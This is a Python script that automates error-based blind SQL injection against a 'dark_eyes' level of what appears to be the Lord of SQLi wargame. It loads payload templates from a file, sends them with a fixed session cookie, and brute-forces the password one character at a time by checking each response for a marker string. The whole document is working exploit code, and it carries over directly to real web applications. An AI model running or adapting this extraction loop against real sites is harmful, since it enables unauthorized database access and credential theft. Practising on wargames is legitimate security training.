import string
import requests
url = "https://los.rubiya.kr/chall/dark_eyes_4e0c557b6751028de2e64d4d0020e02c.php"
session = requests.Session()
char = string.printable
header = {
    'Cookie' : "PHPSESSID=1mg3tdj3njma0epf82af1kr1d2"
}
f1 = open("error-based.txt", "r")

p = "pw"

list=[]        
for ch in f1:                
    print(ch)
    list.append(ch)
user_ch = int(input("your choose : "))
sp = input("special: ")
len_pw = int(input("length :"))
password = ""
s_p = input("Sepecial params : ")

for i in range(1, len_pw):
    for j in char:
        pw = list[user_ch].replace("{pw}", s_p).replace("{i}", str(i)).replace("{j}", str(ord(j))).replace("\n", "")
        get = session.get(url=url, headers=header, params=f"{p}={pw[2:]}")
        print( get.url , get.status_code)
        if (sp in get.text):
            print(len(get.text), pw[2:], get.url)
            password = password + j
            print(password)
            break
f1.close()
